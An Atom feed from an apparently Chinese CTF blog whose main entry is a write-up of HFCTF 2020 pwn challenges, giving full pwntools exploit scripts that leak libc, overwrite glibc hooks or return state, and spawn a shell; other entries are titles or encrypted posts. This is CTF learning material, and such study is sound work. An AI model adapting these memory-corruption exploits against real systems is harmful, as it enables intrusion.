<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-04-28T03:30:39.840Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>__do_global_dtors_aux的gadget</title>
    <link href="https://nocbtm.github.io/2020/04/28/%C2%96-do-global-dtors-aux%E7%9A%84gadget/"/>
    <id>https://nocbtm.github.io/2020/04/28/-do-global-dtors-aux的gadget/</id>
    <published>2020-04-28T03:30:39.000Z</published>
    <updated>2020-04-28T03:30:39.840Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>__stack_chk_fail相关利用</title>
    <link href="https://nocbtm.github.io/2020/04/28/stack-chk-fail%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/28/stack-chk-fail相关利用/</id>
    <published>2020-04-28T03:27:57.000Z</published>
    <updated>2020-04-28T03:27:57.936Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HFCTF pwn witeup</title>
    <link href="https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/"/>
    <id>https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/</id>
    <published>2020-04-20T01:31:03.000Z</published>
    <updated>2020-04-24T02:13:47.864Z</updated>
    
    <content type="html"><![CDATA[<p>虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题</p><h2 id="MarkMan"><a href="#MarkMan" class="headerlink" title="MarkMan"></a>MarkMan</h2><p>这个题耗费了太多时间，程序给了puts函数地址,存在一个任意地址写三字节，任意地址尝试了很多地方，刚开始想往stack上写未果，又往<code>dlopen</code>的<code>_dlfcn_hook</code> 上写未果，最终在exit函数会调用<code>_rtld_global</code>结构中的<code>_dl_rtld_lock_recursive</code>或者<code>_dl_rtld_unlock_recursive</code>处改写成功 ，并且因为<code>_dl_rtld_lock_recursive</code>指向的内容距离 <code>libc.address</code>过大，修改后三字节只会有几率成功</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level   = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#p=remote('39.97.210.182',10055)</span></span><br><span class="line">elf=ELF(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *$rebase(0xcbc)\nb *$rebase(0xcc1)\nb *$rebase(0xd63)\n")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"target near: 0x"</span>)</span><br><span class="line">leak=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">'leak =&gt; &#123;0&#125;'</span>.format(hex(leak)))</span><br><span class="line">success(<span class="string">'libc_address =&gt; &#123;0&#125;'</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">dlfcn_hook=libc.address+(<span class="number">0x15555532d0a0</span><span class="number">-0x155554d60000</span>)</span><br><span class="line">dl_rtld_lock_recursive=libc.address+(<span class="number">0x7f8a645fbf60</span><span class="number">-0x7f8a63dde000</span>)</span><br><span class="line">success(<span class="string">'dl_rtld_lock_recursive =&gt; &#123;0&#125;'</span>.format(hex(dl_rtld_lock_recursive)))</span><br><span class="line">success(<span class="string">'dlfcn_hook =&gt; &#123;0&#125;'</span>.format(hex(dlfcn_hook)))</span><br><span class="line">p.sendline(str(int(dl_rtld_lock_recursive)))</span><br><span class="line"></span><br><span class="line">payload=libc.address+one[<span class="number">1</span>]</span><br><span class="line">info(hex(payload))</span><br><span class="line">yi=payload&amp;<span class="number">0xff</span></span><br><span class="line">er=(payload&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">san=(payload&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">info(hex(yi))</span><br><span class="line">info(hex(er))</span><br><span class="line">info(hex(san))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(yi))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(er))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(san))</span><br><span class="line">p.sendline(<span class="string">"cat flag*"</span>)</span><br><span class="line">con=p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> con:</span><br><span class="line"><span class="keyword">print</span> con</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p><code>arm aarch64</code>架构的题,搭建好qemu环境即可调试,题目很简单,不需要本地调试,直接利用IDA F5查看伪C代码即可写EXP<br>200次输入正确结果,利用python里面的eval函数即可自动计算结果,然后通过覆盖目标变量的值即可getshell</p><p>本地运行需要安装所需要的库 ,搜索aarch64的交叉编译的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo apt-cache search aarch64</span><br><span class="line">cpp-5-aarch64-linux-gnu - GNU C preprocessor</span><br><span class="line">cpp-aarch64-linux-gnu - GNU C preprocessor (cpp) <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">g++-5-aarch64-linux-gnu - GNU C++ 编译器</span><br><span class="line">g++-aarch64-linux-gnu - GNU C++ compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">gcc-5-aarch64-linux-gnu - GNU C 编译器</span><br><span class="line">gcc-5-aarch64-linux-gnu-base - GCC, the GNU Compiler Collection (base package)</span><br><span class="line">gcc-aarch64-linux-gnu - GNU C compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">binutils-aarch64-linux-gnu - GNU binary utilities, <span class="keyword">for</span> aarch64-linux-gnu target</span><br><span class="line">qemu-system-arm - QEMU full system emulation binaries (arm)</span><br></pre></td></tr></table></figure><p>安装所需要的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-5-aarch64-linux-gnu gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">'39.97.210.182'</span>,<span class="string">'40285'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line">    <span class="comment">#os.system("gdb -q -ex 'target remote localhost:1234' ")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>) :</span><br><span class="line">p. recvuntil(<span class="string">"~Math: "</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">" = "</span>)[:<span class="number">-3</span>]</span><br><span class="line">answer = eval(data)</span><br><span class="line">p. sendline(str(answer))</span><br><span class="line">payload= <span class="string">'a'</span>*<span class="number">0x64</span>+p64(<span class="number">0x12235612</span>)</span><br><span class="line">p. sendline(payload)</span><br><span class="line">p. interactive()</span><br></pre></td></tr></table></figure><h2 id="SecureBox"><a href="#SecureBox" class="headerlink" title="SecureBox"></a>SecureBox</h2><p>申请空间的函数,在判断size是否大于0xFFF的时候变量强制转化成了int类型,则有整型溢出,又当申请一个很大的空间的时候,由于空间肯定不够,最终不会申请,对应的指针位置为0,则此刻有了一个超大的size,以及指针以0为初始位置,即可实现任意写,最后将接受到的key值逆序与需要写的内容异或,通过enc函数则可往目标地址写上所需写的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LD <span class="keyword">import</span>*</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,sign = <span class="number">0</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    p.recvuntil(<span class="string">'Key: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(idx,off,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'16'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Msg: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Box ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,<span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Msg: \n'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.30.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">leak(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = [<span class="number">0xCB79A</span>,<span class="number">0xCB79D</span>,<span class="number">0xCB7A0</span>,<span class="number">0xE926B</span>, <span class="number">0xE9277</span>]  <span class="comment">#Kali 2.30</span></span><br><span class="line">rce = libc_base + one_gadget[<span class="number">3</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">new(<span class="number">0x7FFFFFFF00000000</span>+<span class="number">0xFF0</span>)</span><br><span class="line">rand_1 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">rand_2 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">randq_1 = <span class="string">''</span></span><br><span class="line">randq_2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">randq_1 += (rand_1[i<span class="number">-1</span>] + rand_1[i])</span><br><span class="line">randq_2 += (rand_2[i<span class="number">-1</span>] + rand_2[i])</span><br><span class="line">rceq = (int(randq_1,<span class="number">16</span>) ^ rce)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">reallocq = (int(randq_2,<span class="number">16</span>) ^ realloc)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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